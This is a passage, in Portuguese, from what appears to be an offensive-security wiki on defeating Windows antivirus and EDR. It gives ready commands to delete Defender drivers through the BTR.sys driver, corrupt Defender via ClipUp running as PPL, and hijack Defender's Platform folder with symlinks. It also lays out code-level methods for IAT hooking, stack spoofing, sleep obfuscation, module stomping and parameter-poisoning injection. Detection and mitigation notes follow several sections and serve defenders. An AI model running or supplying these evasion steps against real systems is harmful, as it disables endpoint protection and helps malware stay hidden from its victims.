Para as ações 5 e 6, o separador chave/valor no formato transmitido são **duas barras invertidas consecutivas**; um caminho formatado convencionalmente não será dividido corretamente. O arquivo de feedback espelha, em grande parte, a solicitação, mas os primeiros quatro bytes de dados de cada item passam a conter o `NTSTATUS` resultante. Nas ações 1 e 2, que não têm um campo de flags inicial, o BTR desloca o caminho para os quatro bytes reservados finais, liberando espaço para esse status.<sup>[[36]](#references)</sup>

### Fluxo de trabalho do `BTR_CLI` e janela de inicialização antecipada

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) implementa a cadeia completa: extrai `BTR.sys` do Defender local, cria `<random>.sys:changelist` e um fluxo de feedback, serializa/verifica os checksums/criptografa ações encadeadas, cria diretamente a chave de registro do serviço e, em seguida, chama `NtLoadDriver` para `-trigger now` ou deixa o driver como um driver de inicialização do sistema para `-trigger boot`. Preparar diretamente o registro evita o fluxo normal do SCM `CreateServiceW` e, portanto, **não** gera o Event ID 7045 de instalação de serviço. Artefatos acionados na inicialização podem ser removidos posteriormente com `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` não é utilizável porque o BTR realiza operações de E/S de arquivos a partir de `DriverEntry`, antes que a pilha de armazenamento e o link `SystemRoot` estejam prontos. `Start=1`, junto com o grupo de alta prioridade `Boot Bus Extender`, é executado na Fase 1: o NTFS está utilizável, mas muitos drivers de segurança com início do sistema e serviços EDR em modo de usuário ainda não foram inicializados. Filtros com início na inicialização, como `WdFilter`, talvez já estejam carregados, mas o BTR pode remover seus binários ou configurações de serviço antes da próxima inicialização e pode excluir executáveis de serviços antes que o SCM os inicie. O ELAM não fecha essa lacuna porque o BTR é executado após a avaliação dos drivers de inicialização e possui uma assinatura válida da Microsoft.<sup>[[36]](#references)</sup>

Várias ações são executadas em uma única transação. O PoC antepõe a Ação 1 para o caminho fixo `\SystemRoot\Temp\BootClean.log`: o BTR cria esse log, depois processa sua própria solicitação de exclusão e o remove antes de descarregar. Isso reduz as evidências, enquanto armazenar o feedback em `<random>.sys:<random>.dat` permite remover o driver e ambos os fluxos juntos.<sup>[[36]](#references)[[37]](#references)</sup>

### Correlações de alta confiabilidade

Regras baseadas apenas em assinaturas e a lista de bloqueio de drivers vulneráveis da Microsoft não abordam o abuso da funcionalidade prevista do BTR. Prefira estas correlações comportamentais, distinguindo a linhagem legítima do Defender de um iniciador arbitrário.<sup>[[36]](#references)</sup>

- **Sysmon 15:** a criação de `.sys:changelist` é universal no staging do BTR. Um ADS `.dat` associado ao mesmo `.sys` é especialmente suspeito porque o Defender legítimo normalmente coloca o feedback em `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 sem System 7045:** correlacione a criação direta de `HKLM\SYSTEM\CurrentControlSet\Services\<random>` contendo `Args=...:changelist` e `Group=Boot Bus Extender` sem um evento correspondente de instalação do SCM.
- **Sysmon 6 -> 23:** correlacione o carregamento de um driver BTR conhecido, fora da linhagem do Defender, com a exclusão subsequente de arquivos atribuída a `System`/PID 4, especialmente no caso de binários de segurança.
- **Sysmon 11 -> 23:** gere um alerta para a criação e exclusão rápidas de `\SystemRoot\Temp\BootClean.log` por `System`/PID 4.
- Restrinja e audite a atribuição/ativação de `SeLoadDriverPrivilege`; uma assinatura da Microsoft, por si só, não é suficiente para confiar quando o driver de uma ferramenta de segurança é preparado por `cmd.exe`, PowerShell ou um processo desconhecido.

## Abusando do Protected Process Light (PPL) para adulterar AV/EDR com LOLBINs

O Protected Process Light (PPL) aplica uma hierarquia de signatário/nível, de modo que somente processos protegidos de nível igual ou superior podem adulterar uns aos outros. Ofensivamente, se você puder iniciar legitimamente um binário com PPL habilitado e controlar seus argumentos, poderá transformar uma funcionalidade benigna (por exemplo, logging) em uma primitiva de escrita restrita, respaldada por PPL, em diretórios protegidos usados por AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

O que faz um processo ser executado como PPL
- O EXE de destino (e todas as DLLs carregadas) deve estar assinado com um EKU compatível com PPL.
- O processo deve ser criado com CreateProcess usando as flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Deve ser solicitado um nível de proteção compatível com o signatário do binário (por exemplo, `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` para signatários antimalware, `PROTECTION_LEVEL_WINDOWS` para signatários do Windows). Níveis incorretos farão a criação falhar.

Veja também uma introdução mais abrangente a PP/PPL e à proteção do LSASS aqui:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Ferramentas de inicialização
- Helper de código aberto: CreateProcessAsPPL (seleciona o nível de proteção e encaminha os argumentos para o EXE de destino):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Padrão de uso:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

Primitiva LOLBIN: ClipUp.exe
- O binário de sistema assinado `C:\Windows\System32\ClipUp.exe` inicia outro processo e aceita um parâmetro para gravar um arquivo de log em um caminho especificado pelo chamador.
- Quando iniciado como um processo PPL, a gravação do arquivo ocorre com proteção PPL.
- ClipUp não consegue analisar caminhos que contenham espaços; use caminhos curtos 8.3 para apontar para locais normalmente protegidos.

Auxiliares para caminhos curtos 8.3
- Listar nomes curtos: `dir /x` em cada diretório pai.
- Obter o caminho curto no cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Cadeia de abuso (abstrata)
1) Inicie o LOLBIN compatível com PPL (ClipUp) com `CREATE_PROTECTED_PROCESS` usando um launcher (por exemplo, CreateProcessAsPPL).
2) Passe o argumento de caminho do log do ClipUp para forçar a criação de um arquivo em um diretório protegido do AV (por exemplo, Defender Platform). Use nomes curtos 8.3, se necessário.
3) Se o AV normalmente mantiver o binário de destino aberto/bloqueado enquanto estiver em execução (por exemplo, MsMpEng.exe), agende a gravação na inicialização, antes de o AV iniciar, instalando um serviço de início automático que seja executado de forma confiável mais cedo. Valide a ordem de inicialização com o Process Monitor (registro de inicialização).
4) Na reinicialização, a gravação com proteção PPL ocorre antes de o AV bloquear seus binários, corrompendo o arquivo de destino e impedindo a inicialização.

Exemplo de invocação (caminhos omitidos/abreviados por segurança):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Notas e restrições
- Você não pode controlar o conteúdo que o ClipUp grava, apenas o local; a primitiva é adequada para corrupção, não para injeção precisa de conteúdo.
- Requer admin local/SYSTEM para instalar/iniciar um serviço e uma janela de reinicialização.
- O timing é crítico: o alvo não pode estar aberto; a execução durante a inicialização evita bloqueios de arquivos.

Detecções
- Criação do processo `ClipUp.exe` com argumentos incomuns, especialmente quando iniciado por launchers não padrão, próximo à inicialização.
- Novos serviços configurados para iniciar automaticamente binários suspeitos e que iniciam consistentemente antes do Defender/AV. Investigue a criação/modificação de serviços antes de falhas na inicialização do Defender.
- Monitoramento de integridade de arquivos nos binários/diretórios Platform do Defender; criações/modificações inesperadas de arquivos por processos com flags de processo protegido.
- Telemetria ETW/EDR: procure processos criados com `CREATE_PROTECTED_PROCESS` e uso anômalo de nível PPL por binários que não sejam de AV.

Mitigações
- WDAC/Code Integrity: restrinja quais binários assinados podem ser executados como PPL e sob quais processos pai; bloqueie a invocação do ClipUp fora de contextos legítimos.
- Higiene de serviços: restrinja a criação/modificação de serviços de inicialização automática e monitore a manipulação da ordem de inicialização.
- Garanta que a proteção contra adulteração do Defender e as proteções de inicialização antecipada estejam habilitadas; investigue erros de inicialização que indiquem corrupção de binários.
- Considere desabilitar a geração de nomes curtos 8.3 em volumes que hospedam ferramentas de segurança, se isso for compatível com seu ambiente (teste cuidadosamente).

## Adulteração do Microsoft Defender por meio de sequestro de symlink da pasta de versão Platform

O Windows Defender escolhe a plataforma a partir da qual é executado enumerando as subpastas em:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Ele seleciona a subpasta com a string de versão lexicograficamente mais alta (por exemplo, `4.18.25070.5-0`) e, em seguida, inicia os processos do serviço Defender a partir dela (atualizando os caminhos do serviço/registro de acordo). Essa seleção confia nas entradas de diretório, incluindo pontos de nova análise de diretório (symlinks). Um administrador pode explorar isso para redirecionar o Defender a um caminho gravável pelo atacante e conseguir DLL sideloading ou interrupção do serviço.<sup>[[21]](#references)[[22]](#references)</sup>

Pré-requisitos
- Administrador local (necessário para criar diretórios/symlinks dentro da pasta Platform)
- Capacidade de reiniciar ou acionar uma nova seleção da plataforma Defender (reinicialização do serviço durante a inicialização)
- São necessárias apenas ferramentas integradas (`mklink`)

Por que funciona
- O Defender bloqueia gravações em suas próprias pastas, mas sua seleção de plataforma confia nas entradas de diretório e escolhe a versão lexicograficamente mais alta sem validar se o destino resolve para um caminho protegido/confiável.

Passo a passo (exemplo)
1) Prepare um clone gravável da pasta da plataforma atual, por exemplo, `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Crie um symlink de diretório de versão superior dentro de Platform apontando para sua pasta:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Seleção do gatilho (reinicialização recomendada):
```cmd
shutdown /r /t 0
```
4) Verifique se MsMpEng.exe (WinDefend) é executado a partir do caminho redirecionado:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Você deve observar o novo caminho do processo em `C:\TMP\AV\` e a configuração do serviço/registro refletindo esse local.

Opções de pós-exploração
- DLL sideloading/execução de código: Solte/substitua DLLs que o Defender carrega do diretório do aplicativo para executar código nos processos do Defender. Consulte a seção acima: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Interrupção/negação do serviço: Remova o version-symlink para que, na próxima inicialização, o caminho configurado não seja resolvido e o Defender não consiga iniciar:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Observe que esta técnica não fornece escalonamento de privilégios por si só; ela requer direitos de administrador.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

As equipes red team podem deslocar a evasão em tempo de execução do implante C2 para o próprio módulo de destino, fazendo hooking da Import Address Table (IAT) e direcionando APIs selecionadas por meio de código independente de posição (PIC) controlado pelo atacante. Isso generaliza a evasão para além da pequena superfície de APIs exposta por muitos kits (por exemplo, CreateProcessA) e estende as mesmas proteções a BOFs e DLLs de pós-exploração.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Abordagem de alto nível
- Prepare um blob PIC junto ao módulo de destino usando um reflective loader (anexado ao início ou como companion). O PIC deve ser autocontido e independente de posição.
- À medida que a DLL host é carregada, percorra seu IMAGE_IMPORT_DESCRIPTOR e corrija as entradas da IAT das importações visadas (por exemplo, CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) para apontarem para wrappers PIC simples.
- Cada wrapper PIC executa evasões antes de fazer tail-call para o endereço da API real. As evasões típicas incluem:
  - Mascarar/desmascarar a memória em torno da chamada (por exemplo, criptografar regiões do beacon, RWX→RX, alterar nomes/permissões de páginas) e depois restaurá-la.
  - Call-Stack Spoofing: construir uma stack benigna e transferir a execução para a API de destino para que a análise da call stack resolva para os frames esperados.<sup>[[9]](#references)</sup>
- Para garantir compatibilidade, exporte uma interface para que um script Aggressor (ou equivalente) possa registrar quais APIs devem receber hooking para Beacon, BOFs e DLLs de pós-exploração.

Por que usar IAT hooking aqui
- Funciona com qualquer código que use a importação interceptada, sem modificar o código da ferramenta nem depender do Beacon para fazer proxy de APIs específicas.
- Abrange DLLs de pós-exploração: fazer hooking de LoadLibrary* permite interceptar o carregamento de módulos (por exemplo, System.Management.Automation.dll, clr.dll) e aplicar as mesmas evasões de mascaramento/stack às chamadas de API deles.
- Restaura o uso confiável de comandos de pós-exploração que iniciam processos contra detecções baseadas na call stack, encapsulando CreateProcessA/W.

Esboço mínimo de IAT hook (pseudocódigo x64 C/C++)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notas
- Aplique o patch após as relocations/ASLR e antes do primeiro uso da importação. Loaders refletivos como TitanLdr/AceLdr demonstram o hooking durante o DllMain do módulo carregado.
- Mantenha os wrappers pequenos e seguros para PIC; resolva a API verdadeira usando o valor original da IAT capturado antes do patch ou via LdrGetProcedureAddress.
- Use transições RW → RX para PIC e evite deixar páginas com permissões de escrita e execução.

Stub de spoofing da call stack
- Stubs PIC no estilo Draugr criam uma cadeia de chamadas falsa (endereços de retorno dentro de módulos benignos) e então transferem o fluxo para a API real.
- Isso contorna detecções que esperam stacks canônicas de Beacon/BOFs ao chamar APIs sensíveis.
- Combine com técnicas de stack cutting/stack stitching para chegar dentro dos frames esperados antes do prólogo da API.

Integração operacional
- Coloque o loader refletivo antes das DLLs de post-ex para que o PIC e os hooks sejam inicializados automaticamente quando a DLL for carregada.
- Use um script Aggressor para registrar as APIs-alvo, permitindo que Beacon e BOFs se beneficiem de forma transparente do mesmo caminho de evasão, sem alterações no código.

Considerações de detecção/DFIR
- Integridade da IAT: entradas que apontam para endereços que não pertencem a uma imagem (heap/anônimos); verificação periódica dos ponteiros de importação.
- Anomalias na stack: endereços de retorno que não pertencem a imagens carregadas; transições abruptas para PIC não pertencente a imagens; ancestralidade inconsistente de RtlUserThreadStart.
- Telemetria do loader: gravações na IAT dentro do processo, atividade antecipada no DllMain que modifica thunks de importação, regiões RX inesperadas criadas durante o carregamento.
- Evasão do carregamento de imagens: se estiver fazendo hooking de LoadLibrary*, monitore carregamentos suspeitos de assemblies de automação/clr correlacionados a eventos de mascaramento de memória.

Componentes e exemplos relacionados
- Loaders refletivos que fazem patching da IAT durante o carregamento (por exemplo, TitanLdr, AceLdr)
- Hooks de mascaramento de memória (por exemplo, simplehook) e PIC de stack cutting (stackcutting)
- Stubs PIC de spoofing da call stack (por exemplo, Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Hooks de IAT em tempo de importação por meio de um PICO residente

Se você controla um loader refletivo, pode fazer hooking das importações **durante** `ProcessImports()` substituindo o ponteiro `GetProcAddress` do loader por um resolver personalizado que verifica os hooks primeiro:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Crie um **PICO residente** (objeto PIC persistente) que continue ativo depois que o PIC transitório do loader se liberar.
- Exporte uma função `setup_hooks()` que sobrescreve o resolver de importações do loader (por exemplo, `funcs.GetProcAddress = _GetProcAddress`).
- Em `_GetProcAddress`, ignore importações por ordinal e use uma busca de hooks baseada em hash, como `__resolve_hook(ror13hash(name))`. Se houver um hook, retorne-o; caso contrário, delegue para o `GetProcAddress` real.
- Registre os alvos dos hooks no momento da linkagem com entradas Crystal Palace `addhook "MODULE$Func" "hook"`. O hook continua válido porque reside dentro do PICO residente.

Isso permite **redirecionamento da IAT em tempo de importação** sem fazer patch na seção de código da DLL carregada após o carregamento.

### Forçar importações hookable quando o alvo usa PEB-walking

Os hooks em tempo de importação só são acionados se a função estiver de fato na IAT do alvo. Se um módulo resolve APIs por meio de PEB-walk + hash (sem entrada de importação), force uma importação real para que o caminho `ProcessImports()` do loader a processe:

- Substitua a resolução de exports por hash (por exemplo, `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) por uma referência direta como `&WaitForSingleObject`.
- O compilador emite uma entrada na IAT, permitindo a interceptação quando o loader refletivo resolver as importações.

### Ofuscação de sleep/idle no estilo Ekko sem fazer patch em `Sleep()`

Em vez de fazer patch em `Sleep`, faça hooking das **primitivas reais de espera/IPC** usadas pelo implante (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Para esperas longas, envolva a chamada em uma cadeia de ofuscação no estilo Ekko que criptografa a imagem em memória durante o período ocioso:<sup>[[31]](#references)[[27]](#references)</sup>

- Use `CreateTimerQueueTimer` para agendar uma sequência de callbacks que chamam `NtContinue` com frames `CONTEXT` preparados.
- Cadeia típica (x64): definir a imagem como `PAGE_READWRITE` → criptografar com RC4 via `advapi32!SystemFunction032` sobre toda a imagem mapeada → executar a espera bloqueante → descriptografar com RC4 → **restaurar as permissões por seção** percorrendo as seções PE → sinalizar a conclusão.
- `RtlCaptureContext` fornece um `CONTEXT` de modelo; clone-o em vários frames e defina registradores (`Rip/Rcx/Rdx/R8/R9`) para invocar cada etapa.

Detalhe operacional: retorne “success” para esperas longas (por exemplo, `WAIT_OBJECT_0`) para que o chamador continue enquanto a imagem está mascarada. Esse padrão oculta o módulo dos scanners durante períodos ociosos e evita a assinatura clássica de `Sleep()` com patch.

Ideias de detecção (baseadas em telemetria)
- Rajadas de callbacks `CreateTimerQueueTimer` apontando para `NtContinue`.
- Uso de `advapi32!SystemFunction032` em buffers grandes e contíguos do tamanho de uma imagem.
- `VirtualProtect` em intervalos grandes, seguido pela restauração personalizada das permissões por seção.

### Registro de CFG em tempo de execução para gadgets de sleep obfuscation

Em alvos com CFG habilitado, o primeiro salto indireto para um gadget no meio de uma função, como `jmp [rbx]` ou `jmp rdi`, geralmente causa o encerramento do processo com `STATUS_STACK_BUFFER_OVERRUN`, pois o gadget não está presente nos metadados de CFG do módulo. Para manter cadeias no estilo Ekko/Kraken ativas em processos reforçados:<sup>[[30]](#references)</sup>

- Registre cada destino indireto usado pela cadeia com `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` e entradas `CFG_CALL_TARGET_VALID`.
- Para endereços dentro de imagens carregadas (`ntdll`, `kernel32`, `advapi32`), o `MEMORY_RANGE_ENTRY` precisa começar na **base da imagem** e abranger o **tamanho total da imagem**.
- Para regiões mapeadas manualmente/PIC/stomped, use a **base da alocação** e o tamanho da alocação.
- Marque não só o gadget de despacho, mas também os exports alcançados indiretamente (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, syscalls de espera/evento) e quaisquer seções executáveis controladas pelo atacante que se tornarão destinos indiretos.

Isso transforma cadeias de sleep no estilo ROP/JOP, que “funcionam apenas em processos sem CFG”, em uma primitiva reutilizável para `explorer.exe`, navegadores, `svchost.exe` e outros endpoints compilados com `/guard:cf`.

### Spoofing de stack compatível com CET para threads em sleep

A substituição completa de `CONTEXT` gera ruído e pode falhar em sistemas com CET Shadow Stack porque o `Rip` falsificado ainda precisa corresponder à shadow stack de hardware. Um padrão mais seguro para mascarar durante o sleep é:<sup>[[30]](#references)</sup>

- Escolha outra thread no mesmo processo e leia os limites de stack do `NT_TIB` / TEB (`StackBase`, `StackLimit`) via `NtQueryInformationThread`.
- Faça backup do TEB/TIB real da thread atual.
- Capture o contexto real da thread em sleep com `GetThreadContext`.
- Copie **apenas** o `Rip` real para o contexto falsificado, mantendo intacto o estado falsificado de `Rsp`/stack.
- Durante o período de sleep, copie o `NT_TIB` da thread falsificada para o TEB atual, para que os stack walkers desenrolem a stack dentro de um intervalo legítimo.
- Quando a espera terminar, restaure o TIB e o contexto original da thread.

Isso preserva um ponteiro de instrução compatível com CET e, ao mesmo tempo, engana os stack walkers de EDR que confiam nos metadados de stack do TEB para validar o desenrolamento.

### Alternativa baseada em APC: Kraken Mask

Se o despacho por timer queue for muito associado a uma assinatura, a mesma sequência de sleep-encrypt-spoof-restore pode ser executada a partir de uma thread auxiliar suspensa usando APCs enfileirados:<sup>[[27]](#references)</sup>

- Crie uma thread auxiliar com `NtTestAlert` como entrypoint.
- Enfileire frames `CONTEXT`/APCs preparados com `NtQueueApcThread` e execute-os com `NtAlertResumeThread`.
- Armazene o estado da cadeia no heap em vez da stack auxiliar para evitar esgotar a stack padrão de 64 KB da thread.
- Use `NtSignalAndWaitForSingleObject` para sinalizar atomicamente o evento de início e bloquear.
- Suspenda a thread principal antes de restaurar o TIB/contexto (`NtSuspendThread` → restaurar → `NtResumeThread`) para reduzir a janela de corrida em que um scanner poderia capturar uma stack parcialmente restaurada.

Isso troca a assinatura `CreateTimerQueueTimer` + `NtContinue` por uma assinatura de thread auxiliar/APC, mantendo os mesmos objetivos de mascaramento RC4 e spoofing de stack.

Ideias adicionais de detecção
- `NtSetInformationVirtualMemory` com `VmCfgCallTargetInformation` pouco antes de sleeps, esperas ou despacho de APC.
- `GetThreadContext`/`SetThreadContext` envolvendo `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` ou `ConnectNamedPipe`.
- `NtQueryInformationThread` seguido de gravações diretas nos limites de stack do TEB/TIB da thread atual.
- Cadeias `NtQueueApcThread`/`NtAlertResumeThread` que alcançam indiretamente `SystemFunction032`, `VirtualProtect` ou auxiliares de restauração de permissões de seção.
- Uso repetido de assinaturas curtas de gadgets, como `FF 23` (`jmp [rbx]`) ou `FF E7` (`jmp rdi`), como pivôs de despacho dentro de módulos assinados.


## Precision Module Stomping

Module stomping executa payloads a partir da **seção `.text` de uma DLL já mapeada dentro do processo-alvo**, em vez de alocar memória executável privada óbvia ou carregar uma DLL sacrificial nova. O alvo da sobrescrita deve ser uma **imagem carregada, respaldada por arquivo em disco**, cujo espaço de código possa acomodar o payload sem corromper caminhos de código ainda necessários ao processo.<sup>[[1]](#references)[[2]](#references)</sup>

### Seleção confiável do alvo

O stomping ingênuo de módulos comuns, como `uxtheme.dll` ou `comctl32.dll`, é frágil: a DLL pode não estar carregada no processo remoto, e uma região de código pequena demais pode encerrar o processo. Um fluxo de trabalho mais confiável é:

1. Enumere os módulos do processo-alvo e mantenha uma lista de inclusão **somente com nomes** das DLLs já carregadas.
2. Primeiro, compile o payload e registre seu **tamanho exato em bytes**.
3. Analise DLLs candidatas em disco e compare o **`Misc_VirtualSize` da seção PE `.text`** com o tamanho do payload. Isso importa mais do que o tamanho do arquivo porque reflete o tamanho da seção executável **quando mapeada na memória**.
4. Analise a **Export Address Table (EAT)** e escolha o RVA de uma função exportada como deslocamento inicial do stomp.
5. Calcule o **raio de impacto**: se o payload exceder os limites da função selecionada, ele sobrescreverá exports adjacentes dispostos depois dela na memória.

Auxiliares comuns de reconhecimento/seleção observados no mundo real:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Notas operacionais
- Prefira DLLs **já carregadas** no processo remoto para evitar a telemetria de `LoadLibrary`/carregamentos inesperados de imagens.
- Prefira exports raramente executados pela aplicação-alvo; caso contrário, caminhos de código normais podem atingir os bytes sobrescritos antes ou depois da criação da thread.
- Implants grandes geralmente exigem alterar a incorporação do shellcode de uma string literal para um **inicializador de array de bytes/chaves** para que o buffer completo seja representado corretamente no código-fonte do injector.

Ideias de detecção
- Gravações remotas em páginas executáveis respaldadas por imagens (`MEM_IMAGE`, `PAGE_EXECUTE*`), em vez das alocações privadas RWX/RX mais comuns.
- Pontos de entrada de exports cujos bytes na memória não correspondem ao arquivo de origem em disco.
- Threads remotas ou pivôs de contexto que começam a execução dentro de um export legítimo de DLL cujos primeiros bytes foram modificados recentemente.
- Sequências suspeitas de `VirtualProtect(Ex)` / `WriteProcessMemory` direcionadas a páginas `.text` de DLL, seguidas da criação de thread.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) é uma técnica de **injeção de processo / evasão de EDR** que evita o caminho clássico de gravação remota (`VirtualAllocEx` + `WriteProcessMemory`). Em vez de copiar bytes para um alvo já em execução, ela abusa do fato de que o Windows **copia parâmetros de inicialização selecionados de `CreateProcessW` para o processo filho** e os armazena em `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Carregadores suscetíveis a poisoning copiados por `CreateProcessW`

Os carregadores úteis são:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (com `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Restrições práticas dos carregadores:

- `lpCommandLine` deve apontar para **memória gravável** para `CreateProcessW` e tem um limite de **32,767 caracteres Unicode**, incluindo o terminador nulo.
- `lpEnvironment` deve ser um bloco de ambiente Unicode composto por strings sucessivas `NAME=VALUE\0`, terminadas por um `\0` extra.
- `lpReserved` é oficialmente reservado, portanto, o mapeamento para `ShellInfo` deve ser tratado como um detalhe de implementação, não como um contrato documentado estável.

Isso transforma a criação normal de processos na **primitiva de transferência de payload**. O operador cria o processo filho com dados de inicialização controlados pelo atacante e deixa o Windows fazer a cópia entre processos.

### Fluxo de busca remota sem APIs de gravação remota

Após a criação do filho, resolva o buffer copiado usando primitivas **somente de leitura**:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → obter `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Ler o `PEB` remoto
3. Seguir `PEB.ProcessParameters`
4. Ler `RTL_USER_PROCESS_PARAMETERS`
5. Usar o ponteiro selecionado:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Fluxo mínimo:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Executando o buffer de parâmetros copiado

A região de parâmetros copiada geralmente é `RW`, não executável. Uma cadeia P3 comum é:

1. Criar o processo normalmente (não suspenso)
2. Tornar a página de parâmetros escolhida executável com `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Reutilizar o identificador da thread principal já retornado em `PROCESS_INFORMATION`
4. Redirecionar a execução com `NtSetContextThread` (`CONTEXT_CONTROL`, sobrescrever `RIP`)

Ao contrário dos fluxos clássicos de thread hijacking, isso **não exige** `SuspendThread` / `ResumeThread`; o contexto pode ser alterado diretamente no identificador da thread principal retornado.

Isso evita várias APIs comumente monitoradas para injeção:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- muitas vezes também `SuspendThread` / `ResumeThread`

### Limitação de bytes nulos e shellcode em estágios

Os três carriers são **dados de string ou semelhantes a strings**, então um payload bruto que contenha `0x00` é truncado durante a transferência. Uma solução prática é usar um **primeiro estágio sem bytes nulos** que reconstrua constantes em tempo de execução e, em seguida, carregue um segundo estágio arbitrário.

Um padrão simples é a síntese de constantes baseada em XOR:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Isso permite que o primeiro estágio construa strings na stack, argumentos de API, caminhos de DLL ou um carregador de shellcode de segundo estágio sem incorporar bytes nulos no parâmetro transmitido.

### Chamadas de API baseadas na stack a partir do primeiro estágio

Quando o primeiro estágio precisa chamar APIs como `LoadLibraryA`, ele pode:

- colocar a string/buffer na stack do processo alvo
- reservar o **shadow space de 32 bytes do x64**
- definir `RCX`, `RDX`, `R8`, `R9` como constantes ou ponteiros relativos a `RSP`
- manter `RSP` **alinhado a 16 bytes** antes da chamada

Um segundo estágio pode então ser copiado da stack para uma alocação `PAGE_READWRITE`, alterado para `PAGE_EXECUTE_READ` com `VirtualProtect` e executado com um salto, evitando uma alocação RWX direta.

### Ideias para detecção

Boas oportunidades de hunting mencionadas pelos autores:

- `VirtualProtectEx` / `NtProtectVirtualMemory` tornando **executáveis páginas dos parâmetros do processo**
- essa alteração de proteção seguida por `SetThreadContext` / `NtSetContextThread`
- leituras remotas do `PEB` seguidas de leituras de `RTL_USER_PROCESS_PARAMETERS`
- valores excepcionalmente longos ou com alta entropia em `lpCommandLine`, `lpEnvironment` ou `STARTUPINFO.lpReserved` durante a criação do processo

### Observações

- P3 é um **truque de transferência entre processos**, não uma primitiva de execução completa por si só: o parâmetro copiado ainda precisa ter sua permissão alterada para execução e de um método de redirecionamento da execução.
- `RtlCreateProcessReflection` / Dirty Vanity foi considerado pelos autores, mas descartado porque internamente recorre a primitivas suspeitas, como `NtWriteVirtualMemory` e `NtCreateThreadEx`.

## Injeção por pipe de STDIN do console

